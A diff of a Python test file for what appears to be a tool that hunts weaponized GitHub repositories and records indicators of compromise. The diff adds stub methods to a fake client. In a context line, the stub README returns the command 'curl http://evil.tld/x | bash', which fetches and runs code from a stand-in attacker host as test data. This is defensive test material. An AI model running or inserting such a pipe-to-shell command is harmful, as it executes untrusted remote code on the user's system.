@@ -68,6 +68,14 @@ class _Client:
     def get_readme(self, owner, name):
         return "curl http://evil.tld/x | bash\n"
 
+    def get_repo(self, owner, name):
+        return {"default_branch": "main"}
+
+    def compare(self, base_full, base_branch, head_full, head_branch):
+        # Diverged fork; the added weaponization lives in implant.sh, so the
+        # intent delta is diffable and this genuinely-weaponized fork confirms.
+        return {"ahead_by": 2, "files": ["implant.sh"]}
+
 
 def test_hunt_records_learned_iocs_from_confirmed_repo(tmp_path):
     db = Database.open(tmp_path / "h.sqlite")
